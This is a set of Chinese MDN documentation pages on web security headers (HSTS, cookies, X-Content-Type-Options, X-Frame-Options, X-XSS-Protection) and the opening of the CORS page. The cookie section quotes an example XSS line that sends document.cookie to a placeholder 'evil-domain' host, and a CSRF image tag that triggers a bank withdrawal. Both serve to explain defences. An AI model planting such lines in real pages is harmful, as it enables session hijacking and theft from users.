## [描述](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#描述)

一个网站接受一个HTTP的请求，然后跳转到HTTPS，用户可能在开始跳转前，通过没有加密的方式和服务器对话，比如，用户输入http://foo.com或者直接foo.com。

这样存在中间人攻击潜在威胁，**跳转过程可能被恶意网站利用来直接接触用户信息**，而不是原来的加密信息。

网站通过HTTP Strict Transport Security通知浏览器，这个网站禁止使用HTTP方式加载，**浏览器应该自动把所有尝试使用HTTP的请求自动替换为HTTPS请求。**

**注意:** `Strict-Transport-Security` 在通过 HTTP 访问时会被浏览器**忽略;** 因为攻击者可以通过中间人攻击的方式在连接中修改、注入或删除它. 只有在你的网站通过HTTPS访问并且没有证书错误时, 浏览器才认为你的网站支持HTTPS 然后使用 `Strict-Transport-Security` 的值 .

### [浏览器如何处理](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#浏览器如何处理)

你的网站第一次通过HTTPS请求，服务器响应`Strict-Transport-Security` 头，浏览器记录下这些信息，然后后面尝试访问这个网站的请求都会自动把HTTP替换为HTTPS。

当HSTS头设置的过期时间到了，后面通过HTTP的访问恢复到正常模式，不会再自动跳转到HTTPS。

每次浏览器接收到Strict-Transport-Security头，它都会更新这个网站的过期时间，所以网站可以刷新这些信息，防止过期发生。

Chrome、Firefox等浏览器里，当您尝试访问该域名下的内容时，会产生一个307 Internal Redirect（内部跳转），自动跳转到HTTPS请求。

### [示例场景](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#示例场景)

你连接到一个免费WiFi接入点，然后开始浏览网站，访问你的网上银行，查看你的支出，并且支付一些订单。很不幸，你接入的WiFi实际上是黑客的笔记本热点，他们拦截了你最初的HTTP请求，然后跳转到一个你银行网站一模一样的钓鱼网站。 现在，你的隐私数据暴露给黑客了。

Strict Transport Security解决了这个问题；只要你通过HTTPS请求访问银行网站，并且银行网站配置好Strict Transport Security，你的浏览器知道自动使用HTTPS请求，这可以阻止黑客的中间人攻击的把戏。

## [预加载 HSTS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#预加载_hsts)

谷歌维护着一个 [HSTS 预加载服务](https://hstspreload.appspot.com/)。按照如下指示成功提交你的域名后，浏览器将会永不使用非安全的方式连接到你的域名。虽然该服务是由谷歌提供的，但所有浏览器都有使用这份列表的意向（或者已经在用了）。但是，这不是 HSTS 标准的一部分，也不该被当作正式的内容。

- Chrome & Chromium 的 HSTS 预加载列表： https://www.chromium.org/hsts
- Firefox 的 HSTS 预加载列表：[nsSTSPreloadList.inc](https://hg.mozilla.org/mozilla-central/raw-file/tip/security/manager/ssl/nsSTSPreloadList.inc)

## [示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Strict-Transport-Security#示例)

现在和未来的所有子域名会自动使用 HTTPS 连接长达一年。同时阻止了只能通过 HTTP 访问的内容。

```
Strict-Transport-Security: max-age=31536000; includeSubDomains
```

----

# HTTP cookies

HTTP Cookie（也叫 Web Cookie 或浏览器 Cookie）是服务器发送到用户浏览器并保存在本地的一小块数据，它会在浏览器下次向同一服务器再发起请求时被携带并发送到服务器上。**通常，它用于告知服务端两个请求是否来自同一浏览器**，如保持用户的登录状态。Cookie 使基于[无状态](https://developer.mozilla.org/en-US/docs/Web/HTTP/Overview#http_is_stateless_but_not_sessionless)的HTTP协议记录稳定的状态信息成为了可能。

Cookie 主要用于以下三个方面：

- 会话状态管理（如用户登录状态、购物车、游戏分数或其它需要记录的信息）
- 个性化设置（如用户自定义设置、主题等）
- 浏览器行为跟踪（如跟踪分析用户行为等）

Cookie 曾一度用于客户端数据的存储，因当时并没有其它合适的存储办法而作为唯一的存储手段，但现在随着现代浏览器开始支持各种各样的存储方式，Cookie 渐渐被淘汰。由于服务器指定 Cookie 后，浏览器的每次请求都会携带 Cookie 数据，会带来额外的性能开销（尤其是在移动环境下）。新的浏览器API已经允许开发者直接将数据存储到本地，如使用 [Web storage API](https://developer.mozilla.org/zh-CN/docs/Web/API/Web_Storage_API) （本地存储和会话存储）或 [IndexedDB](https://developer.mozilla.org/zh-CN/docs/Web/API/IndexedDB_API) 。

要查看Cookie存储（或网页上能够使用其他的存储方式），你可以在开发者工具中启用**存储查看**（[Storage Inspector](https://firefox-source-docs.mozilla.org/devtools-user/storage_inspector/index.html) ）功能，并在存储树上选中**Cookie**。

## [创建Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#创建cookie)

当服务器收到 HTTP 请求时，服务器可以在响应头里面添加一个 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 选项。浏览器收到响应后通常会保存下 Cookie，之后对该服务器每一次请求中都通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部将 Cookie 信息发送给服务器。另外，Cookie 的过期时间、域、路径、有效期、适用站点都可以根据需要来指定。

### [`Set-Cookie响应头部`和`Cookie请求头部`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#set-cookie响应头部和cookie请求头部)

服务器使用 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 响应头部向用户代理（一般是浏览器）发送 Cookie信息。一个简单的 Cookie 可能像这样：

```
Set-Cookie: <cookie名>=<cookie值>
```

服务器通过该头部告知客户端保存 Cookie 信息。

```http
HTTP/1.0 200 OK
Content-type: text/html
Set-Cookie: yummy_cookie=choco
Set-Cookie: tasty_cookie=strawberry

[页面内容]
```

现在，对该服务器发起的每一次新请求，浏览器都会将之前保存的Cookie信息通过 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 请求头部再发送给服务器。

```http
GET /sample_page.html HTTP/1.1
Host: www.example.org
Cookie: yummy_cookie=choco; tasty_cookie=strawberry
```

>**提示:** 如何在以下几种服务端程序中设置 `Set-Cookie` 响应头信息 :

- [PHP](https://secure.php.net/manual/en/function.setcookie.php)
- [Node.JS](https://nodejs.org/dist/latest-v8.x/docs/api/http.html#http_response_setheader_name_value)
- [Python](https://docs.python.org/3/library/http.cookies.html)
- [Ruby on Rails](https://api.rubyonrails.org/classes/ActionDispatch/Cookies.html)

### [定义 Cookie 的生命周期](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#定义_cookie_的生命周期)

Cookie 的生命周期可以通过两种方式定义：

- **会话期 Cookie** 是最简单的 Cookie：浏览器关闭之后它会被自动删除，也就是说它仅在会话期内有效。会话期Cookie不需要指定过期时间（`Expires`）或者有效期（`Max-Age`）。需要注意的是，有些浏览器提供了会话恢复功能，这种情况下即使关闭了浏览器，会话期Cookie 也会被保留下来，就好像浏览器从来没有关闭一样，这会导致 Cookie 的生命周期无限期延长。
- **持久性 Cookie** 的生命周期取决于过期时间（`Expires`）或有效期（`Max-Age`）指定的一段时间。

例如：

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT;
```

> **提示：**当Cookie的过期时间被设定时，设定的日期和时间只与客户端相关，而不是服务端。

如果您的站点对用户进行身份验证，则每当用户进行身份验证时，它都应重新生成并重新发送会话 Cookie，甚至是已经存在的会话 Cookie。此技术有助于防止[会话固定攻击（session fixation attacks） (en-US)](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks)，在该攻击中第三方可以重用用户的会话。

### [限制访问 Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#限制访问_cookie)

有两种方法可以确保 `Cookie` 被安全发送，并且不会被意外的参与者或脚本访问：**`Secure` 属性和`HttpOnly` 属性。**

标记为 `Secure` 的 Cookie 只应通过被 HTTPS 协议加密过的请求发送给服务端，因此可以预防 [man-in-the-middle](https://developer.mozilla.org/zh-CN/docs/Glossary/MitM) 攻击者的攻击。但即便设置了 `Secure` 标记，敏感信息也不应该通过 Cookie 传输，因为 Cookie 有其固有的不安全性，`Secure` 标记也无法提供确实的安全保障, 例如，可以访问客户端硬盘的人可以读取它。

从 Chrome 52 和 Firefox 52 开始，不安全的站点（`http:`）无法使用Cookie的 `Secure` 标记。

JavaScript [`Document.cookie`](https://developer.mozilla.org/zh-CN/docs/Web/API/Document/cookie) API 无法访问带有 `HttpOnly` 属性的cookie；此类 Cookie 仅作用于服务器。例如，持久化服务器端会话的 Cookie 不需要对 JavaScript 可用，而应具有 `HttpOnly` 属性。此预防措施有助于缓解[跨站点脚本（XSS） (en-US)](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks)攻击。

示例：

```
Set-Cookie: id=a3fWa; Expires=Wed, 21 Oct 2015 07:28:00 GMT; Secure; HttpOnly
```

### [Cookie 的作用域](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#cookie_的作用域)

`Domain` 和 `Path` 标识定义了Cookie的*作用域：*即允许 Cookie 应该发送给哪些URL。

#### Domain 属性

`Domain` 指定了哪些主机可以接受 Cookie。如果不指定，默认为 [origin](https://developer.mozilla.org/zh-CN/docs/Glossary/Origin)，**不包含子域名**。如果指定了`Domain`，则一般包含子域名。因此，指定 `Domain` 比省略它的限制要少。但是，当子域需要共享有关用户的信息时，这可能会有所帮助。 

例如，如果设置 `Domain=mozilla.org`，则 Cookie 也包含在子域名中（如`developer.mozilla.org`）。

当前大多数浏览器遵循 [RFC 6265](https://tools.ietf.org/html/rfc6265)，设置 Domain 时 不需要加前导点。浏览器不遵循该规范，则需要加前导点，例如：`Domain=.mozilla.org`

#### Path 属性

`Path` 标识指定了主机下的哪些路径可以接受 Cookie（该 URL 路径必须存在于请求 URL 中）。以字符 `%x2F` ("/") 作为路径分隔符，子路径也会被匹配。

例如，设置 `Path=/docs`，则以下地址都会匹配：

- `/docs`
- `/docs/Web/`
- `/docs/Web/HTTP`

#### SameSite attribute

`SameSite` Cookie 允许服务器要求某个 cookie 在跨站请求时不会被发送，（其中  [Site (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Site) 由可注册域定义），从而可以阻止跨站请求伪造攻击（[CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF)）。

SameSite cookies 是相对较新的一个字段，[所有主流浏览器都已经得到支持](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility)。

下面是例子：

```
Set-Cookie: key=value; SameSite=Strict
```

SameSite 可以有下面三种值：

- `**None**`**。**浏览器会在同站请求、跨站请求下继续发送 cookies，不区分大小写。
- **`Strict`。**浏览器将只在访问相同站点时发送 cookie。（在原有 Cookies 的限制条件上的加强，如上文 “Cookie 的作用域” 所述）
- **`Lax`。**与 **`Strict`** 类似，但用户从外部站点导航至URL时（例如通过链接）除外。 在新版本浏览器中，为默认选项，Same-site cookies 将会为一些跨站子请求保留，如图片加载或者 frames 的调用，但只有当用户从外部站点导航到URL时才会发送。如 link 链接

以前，如果 SameSite 属性没有设置，或者没有得到运行浏览器的支持，那么它的行为等同于 None，Cookies 会被包含在任何请求中——包括跨站请求。

大多数主流浏览器正在将 [SameSite 的默认值迁移至 Lax](https://www.chromestatus.com/feature/5088147346030592)。如果想要指定 Cookies 在同站、跨站请求都被发送，现在需要明确指定 SameSite 为 None。

#### Cookie prefixes

cookie 的机制使得服务器无法确认 cookie 是在安全来源上设置的，甚至无法确定 cookie 最初是在哪里设置的。

子域上的易受攻击的应用程序可以使用 Domain 属性设置 cookie，从而可以访问所有其他子域上的该 cookie。会话固定攻击中可能会滥用此机制。有关主要缓解方法，请参阅[会话劫持（ session fixation） (en-US)](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks)。

但是，作为[深度防御措施](https://en.wikipedia.org/wiki/Defense_in_depth_(computing))，可以使用 cookie 前缀来断言有关 cookie 的特定事实。有两个前缀可用：

- `__Host-`

  如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，不包括 `Domain` 属性，并将 `Path` 属性设置为 `/` 时，它才在 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 标头中接受。这样，这些 cookie 可以被视为 "domain-locked”。

- `__Secure-`

  如果 cookie 名称具有此前缀，则仅当它也用 `Secure` 属性标记，是从安全来源发送的，它才在 [`Set-Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie) 标头中接受。该前缀限制要弱于 `__Host-` 前缀。

带有这些前缀点 Cookie， 如果不符合其限制的会被浏览器拒绝。请注意，这确保了如果子域要创建带有前缀的 cookie，那么它将要么局限于该子域，要么被完全忽略。由于应用服务器仅在确定用户是否已通过身份验证或 CSRF 令牌正确时才检查特定的 cookie 名称，因此，这有效地充当了针对会话劫持的防御措施。

在应用程序服务器上，Web 应用程序**必须**检查完整的 cookie 名称，包括前缀 —— 用户代理程序在从请求的 [`Cookie`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Cookie) 标头中发送前缀之前，**不会**从 cookie 中剥离前缀。

## [安全](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#安全)

> 信息被存在 Cookie 中时，需要明白 cookie 的值是可以被访问，且可以被终端用户所修改的。根据应用程序的不同，可能需要使用服务器查找的不透明标识符，或者研究诸如 JSON Web Tokens 之类的替代身份验证/机密机制。当机器处于不安全环境时，切记*不能*通过 HTTP Cookie 存储、传输敏感信息。

缓解涉及Cookie的攻击的方法：

- 使用 `HttpOnly` 属性可防止通过 JavaScript 访问 cookie 值。
- 用于敏感信息（例如指示身份验证）的 Cookie 的生存期应较短，并且 `SameSite` 属性设置为`Strict` 或 `Lax`。（请参见上方的 [SameSite Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies$edit#)。）在[支持 SameSite 的浏览器](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Set-Cookie#browser_compatibility)中，这样做的作用是确保不与跨域请求一起发送身份验证 cookie，因此，这种请求实际上不会向应用服务器进行身份验证。

### [会话劫持和 XSS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#会话劫持和_xss)

在 Web 应用中，Cookie 常用来标记用户或授权会话。因此，如果 Web 应用的 Cookie 被窃取，可能导致授权用户的会话受到攻击。常用的窃取 Cookie 的方法有利用社会工程学攻击和利用应用程序漏洞进行 [XSS (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting) 攻击。

```js
(new Image()).src = "http://www.evil-domain.com/steal-cookie.php?cookie=" + document.cookie;
```

`HttpOnly` 类型的 Cookie 用于阻止了JavaScript 对其的访问性而能在一定程度上缓解此类攻击。

### [跨站请求伪造（CSRF）](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#跨站请求伪造（csrf）)

[维基百科](https://en.wikipedia.org/wiki/HTTP_cookie#Cross-site_request_forgery)已经给了一个比较好的 [CSRF](https://developer.mozilla.org/zh-CN/docs/Glossary/CSRF) 例子。比如在不安全聊天室或论坛上的一张图片，它实际上是一个给你银行服务器发送提现的请求：

```html
<img src="http://bank.example.com/withdraw?account=bob&amount=1000000&for=mallory">
```

当你打开含有了这张图片的 HTML 页面时，如果你之前已经登录了你的银行帐号并且 Cookie 仍然有效（还没有其它验证步骤），你银行里的钱很可能会被自动转走。有一些方法可以阻止此类事件的发生：

- 对用户输入进行过滤来阻止 [XSS (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting)；
- 任何敏感操作都需要确认；
- 用于敏感信息的 Cookie 只能拥有较短的生命周期；
- 更多方法可以查看[OWASP CSRF prevention cheat sheet](https://www.owasp.org/index.php/Cross-Site_Request_Forgery_(CSRF)_Prevention_Cheat_Sheet)。

## [跟踪和隐私](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#跟踪和隐私)

### [第三方 Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#第三方_cookie)

Cookie 与域关联。如果此域与您所在页面的域相同，则该 cookie 称为*第一方 cookie（ first-party cookie）*。如果域不同，则它是*第三方 cookie（third-party cookie）*。当托管网页的服务器设置第一方 Cookie 时，该页面可能包含存储在其他域中的服务器上的图像或其他组件（例如，广告横幅），这些图像或其他组件可能会设置第三方 Cookie。这些主要用于在网络上进行广告和跟踪。例如，[types of cookies used by Google](https://policies.google.com/technologies/types)。第三方服务器可以基于同一浏览器在访问多个站点时发送给它的 cookie 来建立用户浏览历史和习惯的配置文件。Firefox 默认情况下会阻止已知包含跟踪器的第三方 cookie。第三方cookie（或仅跟踪 cookie）也可能被其他浏览器设置或扩展程序阻止。阻止 Cookie 会导致某些第三方组件（例如社交媒体窗口小部件）无法正常运行。

如果你没有公开你网站上第三方 Cookie 的使用情况，当它们被发觉时用户对你的信任程度可能受到影响。一个较清晰的声明（比如在隐私策略里面提及）能够减少或消除这些负面影响。在某些国家已经开始对Cookie制订了相应的法规，可以查看维基百科上例子[cookie statement](https://wikimediafoundation.org/wiki/Cookie_statement)。

### [Cookie 相关规定](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#cookie_相关规定)

涉及使用 Cookie 的法律或法规包括：

- 欧盟通用数据隐私法规（GDPR）
- 欧盟的《隐私权指令》
- 加州消费者隐私法

这些规定具有全球影响力，因为它们适用于这些司法管辖区（欧盟和加利福尼亚）的用户访问的万维网上的任何站点，但请注意，加利福尼亚州的法律仅适用于总收入超过2500万美元的实体。）

这些法规包括以下要求：

- 向用户表明您的站点使用 cookie。
- 允许用户选择不接收某些或所有 cookie。
- 允许用户在不接收 Cookie 的情况下使用大部分服务。

可能还存在其他法规来管理您当地的Cookie。您有责任了解并遵守这些规定。有些公司提供 "cookie banner" 代码，可帮助您遵守这些法规。

可以通过[维基百科的相关内容](https://en.wikipedia.org/wiki/HTTP_cookie#EU_cookie_directive)获取最新的各国法律和更精确的信息。

#### 禁止追踪 Do-Not-Track

虽然并没有法律或者技术手段强制要求使用 [`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT)，但是通过[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT) 可以告诉Web程序不要对用户行为进行追踪或者跨站追踪。查看[`DNT`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/DNT) 以获取更多信息。

#### 欧盟 Cookie 指令

关于 Cookie，欧盟已经在[2009/136/EC指令](http://eur-lex.europa.eu/legal-content/EN/TXT/?uri=CELEX:32009L0136)中提了相关要求，该指令已于2011年5月25日生效。虽然指令并不属于法律，但它要求欧盟各成员国通过制定相关的法律来满足该指令所提的要求。当然，各国实际制定法律会有所差别。

该欧盟指令的大意：在征得用户的同意之前，网站不允许通过计算机、手机或其他设备存储、检索任何信息。自从那以后，很多网站都在网站声明中添加了相关说明，告诉用户他们的 Cookie 将用于何处。

### [僵尸 Cookie 和删不掉的 Cookie](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Cookies#僵尸_cookie_和删不掉的_cookie)

Cookie的一个极端使用例子是僵尸Cookie（或称之为“删不掉的Cookie”），这类 Cookie 较难以删除，甚至删除之后会自动重建。这些技术违反了用户隐私和用户控制的原则，可能违反了数据隐私法规，并可能使使用它们的网站承担法律责任。它们一般是使用 [Web storage API](https://developer.mozilla.org/en-US/docs/Web/API/Web_Storage_API)、Flash本地共享对象或者其他技术手段来达到的。

---

# X-Content-Type-Options

`**X-Content-Type-Options**` HTTP 消息头相当于一个提示标志，被服务器用来提示客户端一定要遵循在 [`Content-Type`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Type) 首部中对 [MIME 类型](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types) 的设定，而不能对其进行修改。这就禁用了客户端的 [MIME 类型嗅探](https://developer.mozilla.org/en-US/docs/Web/HTTP/Basics_of_HTTP/MIME_types#MIME_sniffing)行为，换句话说，也就是意味着网站管理员确定自己的设置没有问题。

该消息头最初是由微软在 IE 8 浏览器中引入的，提供给网站管理员用作禁用内容嗅探的手段，内容嗅探技术可能会把不可执行的 MIME 类型转变为可执行的 MIME 类型。在此之后，其他浏览器也相继引入了这个消息头，尽管它们的 MIME 嗅探算法没有那么有侵略性。

安全测试人员通常期望站点设置了该消息头。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options#语法)

```
X-Content-Type-Options: nosniff
```

## [指令](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Content-Type-Options#指令)

- `nosniff`

  下面两种情况的请求将被阻止：请求类型是"`style`" 但是 MIME 类型不是 "`text/css`"，请求类型是"`script`" 但是 MIME 类型不是 [JavaScript MIME 类型](https://html.spec.whatwg.org/multipage/scripting.html#javascript-mime-type)。

> 注意: `nosniff` 只应用于 "`script`" 和 "`style`" 两种类型。事实证明，将其应用于图片类型的文件会导致[与现有的站点冲突](https://github.com/whatwg/fetch/issues/395)。

---

# X-Frame-Options

**`X-Frame-Options`** [HTTP](https://developer.mozilla.org/zh-CN/docs/Web/HTTP) 响应头是用来给浏览器指示允许一个页面可否在 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/frame)、[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/iframe)、[``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/embed) 或者 [``](https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/object) 中展现的标记。站点可以通过确保网站没有被嵌入到别人的站点里面，从而避免[点击劫持](https://developer.mozilla.org/en-US/docs/Web/Security/Types_of_attacks#click-jacking)攻击。

仅当访问文档的用户使用支持 `X-Frame-Options` 的浏览器时，此附加的安全性才会被提供。

**备注：** [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP 响应头有一个 [`frame-ancestors`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) 指令，支持这一指令的浏览器已经[废弃](https://www.w3.org/TR/CSP2/#frame-ancestors-and-frame-options)了 `X-Frame-Options` 响应头。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#语法)

`X-Frame-Options` 有两个可能的值：

```
X-Frame-Options: DENY
X-Frame-Options: SAMEORIGIN
```

### [指南](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#指南)

如果设置为 `DENY`，不光在别人的网站 frame 嵌入时会无法加载，在同域名页面中同样会无法加载。另一方面，如果设置为 `SAMEORIGIN`，那么页面就可以在同域名页面的 frame 中嵌套。

- `DENY`

  表示该页面不允许在 frame 中展示，**即便是在相同域名的页面中嵌套也不允许。**

- `SAMEORIGIN`

  表示该页面可以在相同域名页面的 frame 中展示。规范让浏览器厂商决定此选项是否应用于顶层、父级或整个链，**有人认为该选项不是很有用，除非所有的祖先页面都属于同一来源**（origin）（见 [bug 725490](https://bugzilla.mozilla.org/show_bug.cgi?id=725490)）。参见[浏览器兼容性](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#浏览器兼容性)以获取详细的兼容性信息。

- `ALLOW-FROM uri` Deprecated

  这是一个被弃用的指令，不再适用于现代浏览器，请不要使用它。在支持旧版浏览器时，页面可以在指定来源的 frame 中展示。请注意，在旧版 Firefox 上，它会遇到与 `SAMEORIGIN` 相同的问题——它不会检查 frame 所有的祖先页面来确定他们是否是同一来源。[`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) HTTP 首部有一个 [`frame-ancestors`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy/frame-ancestors) 指令，你可以使用这一指令来代替。

## [示例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#示例)

**备注：** 使用<meta> 标签来设置 `X-Frame-Options` 是无效的！例如 `<meta http-equiv="X-Frame-Options" content="deny">` 没有任何效果。不要这样用！只有当像下面示例那样设置 HTTP 头 `X-Frame-Options` 才会生效。

### [配置 Apache](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#配置_apache)

配置 Apache 在所有页面上发送 `X-Frame-Options` 响应头，需要把下面这行添加到 'site' 的配置中：

```
Header always set X-Frame-Options "SAMEORIGIN"
```

要将 Apache 的配置 `X-Frame-Options` 设置成 `DENY`，按如下配置去设置你的站点：

```
Header set X-Frame-Options "DENY"
```

### [配置 Nginx](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#配置_nginx)

配置 Nginx 发送 `X-Frame-Options` 响应头，把下面这行添加到 'http', 'server' 或者 'location' 的配置中：

```
add_header X-Frame-Options SAMEORIGIN always;
```

### [配置 IIS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#配置_iis)

配置 IIS 发送 `X-Frame-Options` 响应头，添加下面的配置到 `Web.config` 文件中：

```
<system.webServer>
  ...

  <httpProtocol>
    <customHeaders>
      <add name="X-Frame-Options" value="SAMEORIGIN" />
    </customHeaders>
  </httpProtocol>

  ...
</system.webServer>
```

Copy to Clipboard

参见 [Microsoft 关于使用 IIS Manager 来修改这一配置的支持文章](https://support.microsoft.com/zh-cn/office/mitigating-framesniffing-with-the-x-frame-options-header-1911411b-b51e-49fd-9441-e8301dcdcd79)用户界面。

### [配置 HAProxy](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#配置_haproxy)

配置 HAProxy 发送 `X-Frame-Options` 响应头，添加这些到你的前端、监听（listen），或者后端的配置里面：

```
rspadd X-Frame-Options:\ SAMEORIGIN
```

或者，在较新的版本中：

```
http-response set-header X-Frame-Options SAMEORIGIN
```

### [配置 Express](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-Frame-Options#配置_express)

要配置 Express 以发送 `X-Frame-Options` 响应头，你可以使用借助了 [frameguard](https://helmetjs.github.io/docs/frameguard/) 的 [helmet](https://helmetjs.github.io/) 来设置首部。在你的服务器配置里面添加：

```js
const helmet = require('helmet');
const app = express();
app.use(helmet.frameguard({ action: 'SAMEORIGIN' }));
```

或者，你也可以直接用 frameguard：

```js
const frameguard = require('frameguard')
app.use(frameguard({ action: 'SAMEORIGIN' }))
```

---

# X-XSS-Protection

HTTP **`X-XSS-Protection`** 响应头是 Internet Explorer，Chrome 和 Safari 的一个特性，当检测到跨站脚本攻击 ([XSS (en-US)](https://developer.mozilla.org/en-US/docs/Glossary/Cross-site_scripting))时，浏览器将停止加载页面。若网站设置了良好的 [`Content-Security-Policy`](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/Content-Security-Policy) 来禁用内联 JavaScript (`'unsafe-inline'`)，现代浏览器不太需要这些保护， 但其仍然可以为尚不支持 [CSP](https://developer.mozilla.org/zh-CN/docs/Glossary/CSP) 的旧版浏览器的用户提供保护。

## [语法](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection#语法)

```http
X-XSS-Protection: 0
X-XSS-Protection: 1
X-XSS-Protection: 1; mode=block
X-XSS-Protection: 1; report=<reporting-uri>
```

- 0

  禁止XSS过滤。

- 1

  启用XSS过滤（通常浏览器是默认的）。 如果检测到跨站脚本攻击，浏览器将清除页面（删除不安全的部分）。

- 1;mode=block

  启用XSS过滤。 如果检测到攻击，浏览器将不会清除页面，而是阻止页面加载。

- 1; report=<reporting-URI> (Chromium only)

  启用XSS过滤。 如果检测到跨站脚本攻击，浏览器将清除页面并使用CSP [report-uri (en-US)](https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/Content-Security-Policy/report-uri)指令的功能发送违规报告。

## [范例](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/Headers/X-XSS-Protection#范例)

当检测到XSS攻击时阻止页面加载：

```
X-XSS-Protection: 1;mode=block
```

Copy to Clipboard

PHP

```php
header("X-XSS-Protection: 1; mode=block");
```

Apache (.htaccess)

```xml
<IfModule mod_headers.c>
  Header set X-XSS-Protection "1; mode=block"
</IfModule>
```

```
add_header "X-XSS-Protection" "1; mode=block";
```

---

# 跨源资源共享（CORS）

`跨源资源共享` ([CORS](https://developer.mozilla.org/zh-CN/docs/Glossary/CORS))（或通俗地译为跨域资源共享）是一种基于 [HTTP](https://developer.mozilla.org/zh-CN/docs/Glossary/HTTP) 头的机制，该机制通过允许服务器标示除了它自己以外的其它 [origin](https://developer.mozilla.org/zh-CN/docs/Glossary/Origin)（域，协议和端口），使得浏览器允许这些 origin 访问加载自己的资源。跨源资源共享还通过一种机制来检查服务器是否会允许要发送的真实请求，该机制通过浏览器发起一个到服务器托管的跨源资源的"预检"请求。在预检中，浏览器发送的头中标示有HTTP方法和真实请求中会用到的头。

跨源HTTP请求的一个例子：运行在 `https://domain-a.com` 的 JavaScript 代码使用 [`XMLHttpRequest`](https://developer.mozilla.org/zh-CN/docs/Web/API/XMLHttpRequest) 来发起一个到 `https://domain-b.com/data.json` 的请求。

出于安全性，浏览器限制脚本内发起的跨源HTTP请求。 例如，`XMLHttpRequest` 和 [Fetch API](https://developer.mozilla.org/zh-CN/docs/Web/API/Fetch_API) 遵循[同源策略](https://developer.mozilla.org/zh-CN/docs/Web/Security/Same-origin_policy)。这意味着使用这些 API 的 Web 应用程序只能从加载应用程序的同一个域请求 HTTP 资源，除非响应报文包含了正确 CORS 响应头。

![img](https://developer.mozilla.org/en-US/docs/Web/HTTP/CORS/cors_principle.png)

